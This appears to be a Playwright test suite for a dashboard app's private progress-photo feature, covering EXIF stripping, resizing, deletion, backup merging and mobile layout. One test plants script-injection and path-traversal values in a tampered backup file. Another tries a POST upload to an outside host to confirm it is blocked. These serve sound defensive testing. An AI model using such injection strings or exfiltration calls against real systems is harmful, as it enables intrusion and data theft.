import { expect, test } from '@playwright/test';
import type { Page } from '@playwright/test';
import fs from 'fs';
import path from 'path';
import { APP, expectNoA11yViolations, inspectPicture, newContext, newDevice, PHONE, setUpEmptyDashboard, storedPhotos } from './helpers';

const FRONT = path.join(import.meta.dirname, 'fixtures', 'photo-front.jpg');
const SIDE = path.join(import.meta.dirname, 'fixtures', 'photo-side.jpg');
const NOT_A_PHOTO = path.join(import.meta.dirname, 'fixtures', 'not-a-photo.jpg');

const goBody = (page: Page) => page.getByRole('button', { name: 'Body', exact: true }).first().click();
const panel = (page: Page) => page.locator('section[aria-labelledby="photos-title"]');
/** Adds a picture on the Body screen with a date and a note, and waits until it is saved. */
const add = async (page: Page, file: string, date: string, note = '') => {
  const p = panel(page);
  await p.getByLabel('Date').fill(date);
  await p.getByLabel('Note (optional)').fill(note);
  await p.getByLabel('Choose a picture from this device').setInputFiles(file);
  await expect(p.getByRole('status')).toContainText('Photo saved on this device');
};
const openSync = async (page: Page) => {
  await page.getByRole('button', { name: 'Sync and backup' }).first().click();
  await page.locator('#sync-title').waitFor();
};
const download = async (page: Page, to: string) => {
  const [dl] = await Promise.all([page.waitForEvent('download'), page.getByRole('button', { name: 'Download copy' }).click()]);
  await dl.saveAs(to);
  return JSON.parse(fs.readFileSync(to, 'utf8')) as Record<string, unknown>;
};

test('a photo is shrunk, stripped of hidden details and kept only in this browser', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser);
  page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(page);
  await goBody(page);
  await expect(panel(page)).toContainText('not synced');
  await expect(panel(page).getByText('No photos yet')).toBeVisible();

  // the picture is 2400 x 1800 and carries where it was taken and the phone model
  const original = fs.readFileSync(FRONT).toString('latin1');
  expect(original).toContain('Exif');
  expect(original).toContain('TestPhoneMaker');

  await add(page, FRONT, '2026-09-01', 'Front, relaxed');
  const [kept] = await storedPhotos(page);
  expect(kept).toMatchObject({ date: '2026-09-01', note: 'Front, relaxed' });
  const full = await inspectPicture(page, kept.full, ['Exif', 'TestPhone', 'GPS']);
  expect({ w: full.w, h: full.h }, 'longest side is 1280, same shape').toEqual({ w: 1280, h: 960 });
  expect(full.contains, 'the camera’s hidden details are gone').toEqual([]);
  const thumb = await inspectPicture(page, kept.thumb, ['Exif']);
  expect({ w: thumb.w, h: thumb.h }).toEqual({ w: 320, h: 240 });
  expect(kept.full.length, 'small enough to keep many').toBeLessThan(400_000);

  // shown in the grid and kept apart from the dashboard data
  await expect(panel(page).locator('.photo-grid li')).toHaveCount(1);
  await expect(panel(page).locator('.photo-grid li').first()).toContainText('Front, relaxed');
  await page.waitForTimeout(500);
  const everything = await page.evaluate(() => JSON.stringify(Object.fromEntries(Object.entries(localStorage))));
  expect(everything, 'not in the saved dashboard data or its backup').not.toContain('data:image');
  expect(everything).not.toContain('/9j/');

  // still there after closing and opening the app again
  await page.reload();
  await goBody(page);
  await expect(panel(page).locator('.photo-grid li')).toHaveCount(1);

  // a small picture is not enlarged
  await add(page, SIDE, '2026-10-01');
  const side = (await storedPhotos(page)).find((p) => p.date === '2026-10-01')!;
  expect(await inspectPicture(page, side.full, [])).toMatchObject({ w: 600, h: 800 });
  expect(errors).toEqual([]);
  await ctx.close();
});

test('two photos can be compared, and the gap between them is stated', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser);
  page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(page);
  await goBody(page);
  await add(page, SIDE, '2026-10-01', 'After');
  await expect(panel(page).getByRole('heading', { name: 'Compare' }), 'one photo has nothing to compare with').toHaveCount(0);
  await add(page, FRONT, '2026-09-01', 'Before');

  // oldest on the left whatever order they were added in
  await expect(panel(page).locator('.photo-grid li').first()).toContainText('Before');
  await expect(panel(page).getByTestId('photo-gap')).toHaveText('30 days apart.');
  const pair = panel(page).locator('.photo-pair img');
  await expect(pair).toHaveCount(2);
  await expect(pair.nth(0)).toHaveAttribute('alt', /Before: progress photo from .*Before/);
  await expect(pair.nth(1)).toHaveAttribute('alt', /After: progress photo from .*After/);
  await expect.poll(() => pair.nth(0).evaluate((i: HTMLImageElement) => i.naturalWidth)).toBe(1280);
  await expect.poll(() => pair.nth(1).evaluate((i: HTMLImageElement) => i.naturalWidth)).toBe(600);

  // either side can be switched, even to the same photo
  const afterSelect = panel(page).locator('select').nth(1);
  await expect(afterSelect.locator('option')).toHaveCount(2);
  await afterSelect.selectOption({ index: 0 });
  await expect(panel(page).getByTestId('photo-gap')).toHaveText('The same photo is chosen on both sides.');
  await expectNoA11yViolations(page, 'body with photos and compare');

  // one photo can be opened large
  await panel(page).getByRole('button', { name: /Open the photo from/ }).first().click();
  await expect(panel(page).locator('.photo-view img')).toBeVisible();
  await panel(page).getByRole('button', { name: 'Close photo' }).click();
  await expect(panel(page).locator('.photo-view')).toHaveCount(0);
  expect(errors).toEqual([]);
  await ctx.close();
});

test('photos can be deleted one at a time or all at once, and a cancelled delete keeps them', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser);
  await setUpEmptyDashboard(page);
  await goBody(page);
  await add(page, FRONT, '2026-09-01', 'one');
  await add(page, SIDE, '2026-09-15', 'two');
  await add(page, SIDE, '2026-10-01', 'three');
  const grid = panel(page).locator('.photo-grid li');
  await expect(grid).toHaveCount(3);

  page.once('dialog', (d) => void d.dismiss());
  await panel(page).getByRole('button', { name: /Delete the photo from .*two/ }).click();
  await expect(grid).toHaveCount(3);
  expect(await storedPhotos(page)).toHaveLength(3);

  page.once('dialog', (d) => {
    expect(d.message()).toMatch(/cannot be undone/);
    void d.accept();
  });
  await panel(page).getByRole('button', { name: /Delete the photo from .*two/ }).click();
  await expect(grid).toHaveCount(2);
  await expect(panel(page).getByRole('status')).toHaveText('Photo deleted.');
  expect((await storedPhotos(page)).map((p) => p.note).sort(), 'the big picture goes too, not just the thumbnail').toEqual(['one', 'three']);

  page.once('dialog', (d) => {
    expect(d.message()).toContain('Delete all 2 progress photos');
    void d.accept();
  });
  await panel(page).getByRole('button', { name: 'Delete all photos' }).click();
  await expect(panel(page).getByText('No photos yet')).toBeVisible();
  expect(await storedPhotos(page)).toEqual([]);
  expect(errors).toEqual([]);
  await ctx.close();
});

test('adding works with no connection, and says so plainly when a file or the browser will not do it', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser);
  await setUpEmptyDashboard(page);
  await goBody(page);

  await ctx.setOffline(true);
  await add(page, SIDE, '2026-10-01', 'offline');
  await ctx.setOffline(false);
  expect(await storedPhotos(page)).toHaveLength(1);

  // text pretending to be a picture
  await panel(page).getByLabel('Choose a picture from this device').setInputFiles(NOT_A_PHOTO);
  await expect(panel(page).getByRole('alert')).toContainText('could not be opened as a picture');
  await expect(panel(page).getByRole('alert')).toContainText('Nothing was added');
  expect(await storedPhotos(page)).toHaveLength(1);

  // the next good one clears the message
  await add(page, SIDE, '2026-10-02');
  await expect(panel(page).getByRole('alert')).toHaveCount(0);
  expect(errors).toEqual([]);
  await ctx.close();
});

test('when the browser refuses to keep photos the person is told, and nothing is half-saved', async ({ browser }) => {
  // no storage at all (private browsing, blocked site data)
  const blocked = await newContext(browser);
  await blocked.addInitScript(() => {
    Object.defineProperty(window, 'indexedDB', {
      value: {
        open() {
          throw new Error('blocked');
        },
      },
    });
  });
  const a = await blocked.newPage();
  const errorsA: string[] = [];
  a.on('pageerror', (e) => errorsA.push(e.message));
  await a.goto(APP);
  await setUpEmptyDashboard(a);
  await goBody(a);
  await expect(panel(a).getByRole('alert')).toContainText('not letting the app keep photos');
  await panel(a).getByLabel('Choose a picture from this device').setInputFiles(SIDE);
  await expect(panel(a).getByRole('alert')).toContainText('not letting the app keep photos');
  await expect(panel(a).getByRole('alert')).toContainText('Nothing was added');
  expect(errorsA).toEqual([]);
  await blocked.close();

  // storage that is full
  const full = await newContext(browser);
  await full.addInitScript(() => {
    const put = IDBObjectStore.prototype.put;
    IDBObjectStore.prototype.put = function (this: IDBObjectStore, ...args: Parameters<IDBObjectStore['put']>) {
      if ((window as unknown as { __full?: boolean }).__full && this.name === 'full') throw new DOMException('full', 'QuotaExceededError');
      return put.apply(this, args);
    };
  });
  const b = await full.newPage();
  const errorsB: string[] = [];
  b.on('pageerror', (e) => errorsB.push(e.message));
  await b.goto(APP);
  await setUpEmptyDashboard(b);
  await goBody(b);
  await add(b, SIDE, '2026-10-01', 'fits');
  await b.evaluate(() => ((window as unknown as { __full?: boolean }).__full = true));
  await panel(b).getByLabel('Choose a picture from this device').setInputFiles(FRONT);
  await expect(panel(b).getByRole('alert')).toContainText('would not save the photo');
  expect((await storedPhotos(b)).map((p) => p.note), 'the one that did not fit left nothing behind').toEqual(['fits']);
  expect(errorsB).toEqual([]);
  await full.close();
});

test('photos are in a saved copy only when asked, and another device can bring them in', async ({ browser }, testInfo) => {
  test.setTimeout(150_000);
  const dir = testInfo.outputDir;
  fs.mkdirSync(dir, { recursive: true });
  const A = await newDevice(browser);
  A.page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(A.page);
  await openSync(A.page);
  await expect(A.page.getByLabel(/Include my .* progress photo/), 'no box when there are no photos').toHaveCount(0);
  await A.page.getByRole('button', { name: 'Close', exact: true }).click();

  await goBody(A.page);
  await add(A.page, FRONT, '2026-09-01', 'Front');
  await add(A.page, SIDE, '2026-10-01', 'Side');

  // 1. an ordinary copy has no photos in it
  await openSync(A.page);
  const box = A.page.getByLabel('Include my 2 progress photos (the file will be much bigger)');
  await expect(box).not.toBeChecked();
  const plain = await download(A.page, path.join(dir, 'plain.json'));
  expect(plain.photos).toBeUndefined();
  expect(fs.readFileSync(path.join(dir, 'plain.json'), 'utf8')).not.toContain('data:image');
  // 2. with the box ticked they are
  await box.check();
  const withPhotos = await download(A.page, path.join(dir, 'with.json'));
  expect((withPhotos.photos as unknown[]).length).toBe(2);
  expect((withPhotos.photos as { note: string }[]).map((p) => p.note).sort()).toEqual(['Front', 'Side']);
  const photoBytes = (await storedPhotos(A.page)).reduce((n, p) => n + p.full.length + p.thumb.length, 0);
  expect(photoBytes).toBeGreaterThan(10_000);
  expect(fs.statSync(path.join(dir, 'with.json')).size - fs.statSync(path.join(dir, 'plain.json')).size, 'the copy carries the whole of both pictures').toBeGreaterThanOrEqual(photoBytes * 0.95);
  await expectNoA11yViolations(A.page, 'sync dialog with the photo box');

  // 3. a new device that starts from that copy gets them
  const B = await newDevice(browser);
  await B.page.locator('input[type=file]').first().setInputFiles(path.join(dir, 'with.json'));
  await expect(B.page.getByText('Today’s plates')).toBeVisible();
  await expect.poll(async () => (await storedPhotos(B.page)).length).toBe(2);
  await goBody(B.page);
  await expect(panel(B.page).locator('.photo-grid li')).toHaveCount(2);
  const brought = (await storedPhotos(B.page)).find((p) => p.note === 'Front')!;
  expect(await inspectPicture(B.page, brought.full, [])).toMatchObject({ w: 1280, h: 960 });

  // 4. a device that already has its own photo adds the new ones and keeps its own
  const C = await newDevice(browser);
  C.page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(C.page);
  await goBody(C.page);
  await add(C.page, SIDE, '2026-09-15', 'Mine');
  await openSync(C.page);
  await C.page.locator('.modal input[type=file]').setInputFiles(path.join(dir, 'with.json'));
  await expect(C.page.locator('.preview-box')).toContainText('The file also has 2 progress photos; 2 are new to this device. Photos are only ever added, never removed.');
  await C.page.getByRole('button', { name: 'Merge', exact: true }).click();
  await expect(C.page.getByRole('status').last()).toContainText('2 photos added');
  await C.page.getByRole('button', { name: 'Close', exact: true }).click();
  expect((await storedPhotos(C.page)).map((p) => p.note).sort()).toEqual(['Front', 'Mine', 'Side']);

  // 5. the same file again adds nothing
  await openSync(C.page);
  await C.page.locator('.modal input[type=file]').setInputFiles(path.join(dir, 'with.json'));
  await expect(C.page.locator('.preview-box')).toContainText('0 are new to this device');
  await C.page.getByRole('button', { name: 'Merge', exact: true }).click();
  await expect(C.page.getByRole('status').last()).not.toContainText('photo');
  expect(await storedPhotos(C.page)).toHaveLength(3);

  // 6. "Replace" with a copy that has no photos never removes the photos on the device
  await C.page.locator('.modal input[type=file]').setInputFiles(path.join(dir, 'plain.json'));
  await C.page.getByRole('button', { name: 'Replace instead' }).click();
  await expect(C.page.getByRole('status').last()).toContainText('Replaced.');
  expect(await storedPhotos(C.page)).toHaveLength(3);

  for (const d of [A, B, C]) {
    expect(d.errors).toEqual([]);
    await d.ctx.close();
  }
});

test('a copy with damaged or unsafe photos in it is accepted for its data and the bad photos are left out', async ({ browser }, testInfo) => {
  const dir = testInfo.outputDir;
  fs.mkdirSync(dir, { recursive: true });
  const A = await newDevice(browser);
  A.page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(A.page);
  await goBody(A.page);
  await add(A.page, SIDE, '2026-10-01', 'Good');
  await openSync(A.page);
  await A.page.getByLabel(/Include my 1 progress photo/).check();
  const file = await download(A.page, path.join(dir, 'ok.json'));
  const good = (file.photos as Record<string, unknown>[])[0];
  const tampered = {
    ...file,
    photos: [
      good,
      { ...good, id: 'evil1', full: 'data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+PC9zdmc+' },
      { ...good, id: 'evil2', thumb: 'data:image/jpeg;base64,AAAA"><img src=x onerror=alert(1)>' },
      { ...good, id: '../../etc', note: 'path' },
      { ...good, id: 'evil4', date: '2026-02-30' },
      { ...good, id: 'ok2', note: '<b>bold</b>' },
    ],
  };
  fs.writeFileSync(path.join(dir, 'tampered.json'), JSON.stringify(tampered));

  const B = await newDevice(browser);
  const dialogs: string[] = [];
  B.page.on('dialog', (d) => {
    dialogs.push(d.message());
    void d.dismiss();
  });
  await B.page.locator('input[type=file]').first().setInputFiles(path.join(dir, 'tampered.json'));
  await expect(B.page.getByText('Today’s plates')).toBeVisible();
  await expect.poll(async () => (await storedPhotos(B.page)).length).toBe(2);
  expect((await storedPhotos(B.page)).map((p) => p.id).sort()).toEqual([String(good.id), 'ok2'].sort());
  await goBody(B.page);
  // a note is only ever shown as text
  await expect(panel(B.page).locator('.photo-grid li', { hasText: '<b>bold</b>' })).toHaveCount(1);
  await expect(panel(B.page).locator('.photo-grid b')).toHaveCount(0);
  expect(dialogs, 'nothing in the file ran').toEqual([]);
  expect(A.errors.concat(B.errors)).toEqual([]);
  await A.ctx.close();
  await B.ctx.close();
});

test('"Erase everything on this device" removes the photos too', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser);
  page.on('dialog', (d) => {
    if (/Erase everything/.test(d.message())) expect(d.message()).toContain('progress photos');
    void d.accept();
  });
  await setUpEmptyDashboard(page);
  await goBody(page);
  await add(page, SIDE, '2026-10-01');
  expect(await storedPhotos(page)).toHaveLength(1);
  await page.getByRole('button', { name: 'Settings' }).last().click();
  await page.getByRole('button', { name: 'Erase everything on this device' }).click();
  await expect(page.getByRole('heading', { name: 'Welcome' })).toBeVisible();
  await expect.poll(async () => (await storedPhotos(page)).length).toBe(0);
  expect(errors).toEqual([]);
  await ctx.close();
});

test('nothing is requested from anywhere while photos are added, compared, saved in a copy and deleted', async ({ browser }, testInfo) => {
  const { ctx, page, errors } = await newDevice(browser, undefined, 'about:blank');
  page.on('dialog', (d) => void d.accept());
  const requests: { method: string; url: string; body: string }[] = [];
  const policy: string[] = [];
  page.on('request', (r) => requests.push({ method: r.method(), url: r.url(), body: r.postData() ?? '' }));
  page.on('console', (m) => /Content Security Policy/i.test(m.text()) && policy.push(m.text()));
  await page.goto(APP);
  await setUpEmptyDashboard(page);
  requests.length = 0; // everything from here is the photo work

  await goBody(page);
  await add(page, FRONT, '2026-09-01', 'Front');
  await add(page, SIDE, '2026-10-01', 'Side');
  await panel(page).getByRole('button', { name: /Open the photo from/ }).first().click();
  await openSync(page);
  await page.getByLabel(/Include my 2 progress photos/).check();
  await download(page, path.join(testInfo.outputDir, 'copy.json'));
  await page.getByRole('button', { name: 'Close', exact: true }).click();
  await panel(page).getByRole('button', { name: /Delete the photo from .*Front/ }).click();
  await panel(page).getByRole('button', { name: 'Delete all photos' }).click();
  await expect(panel(page).getByText('No photos yet')).toBeVisible();

  const outside = requests.filter((r) => !r.url.startsWith(APP) && !r.url.startsWith('data:') && !r.url.startsWith('blob:'));
  expect(outside, 'no request to any other address').toEqual([]);
  expect(requests.filter((r) => r.method !== 'GET'), 'nothing posted at all').toEqual([]);
  expect(requests.filter((r) => r.body), 'no request carries a body').toEqual([]);
  expect(requests.filter((r) => /jpe?g|photo|image/i.test(r.url.replace(APP, ''))), 'no photo-shaped address was asked for').toEqual([]);

  // and the browser's own rules would stop an attempt to send a picture somewhere
  const outcome = await page.evaluate(async () => {
    try {
      await fetch('https://example.org/upload', { method: 'POST', body: 'data:image/jpeg;base64,AAAA' });
      return 'sent';
    } catch {
      return 'refused';
    }
  });
  expect(outcome).toBe('refused');
  expect(policy.join(' ')).toContain('connect-src');
  expect(errors).toEqual([]);
  await ctx.close();
});

test('on a phone the photo area fits the screen and the buttons are easy to hit', async ({ browser }) => {
  const { ctx, page, errors } = await newDevice(browser, PHONE);
  page.on('dialog', (d) => void d.accept());
  await setUpEmptyDashboard(page);
  await goBody(page);
  await add(page, FRONT, '2026-09-01', 'A long note that goes on and on and on, to be sure it wraps');
  await add(page, SIDE, '2026-10-01', 'Side');
  await expect(panel(page).locator('.photo-pair img')).toHaveCount(2);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth + 1), 'no sideways scroll').toBe(true);
  for (const b of await panel(page).locator('.photo-card button').all()) {
    const box = (await b.boundingBox())!;
    expect(box.height, 'tall enough to tap').toBeGreaterThanOrEqual(36);
  }
  const small = await panel(page).locator('input:not([type=file]):not([type=checkbox]), select').evaluateAll((els) => els.filter((e) => parseFloat(getComputedStyle(e).fontSize) < 16).length);
  expect(small, 'no box under 16px, which would make an iPhone zoom in').toBe(0);
  await expectNoA11yViolations(page, 'body with photos on a phone');
  expect(errors).toEqual([]);
  await ctx.close();
});
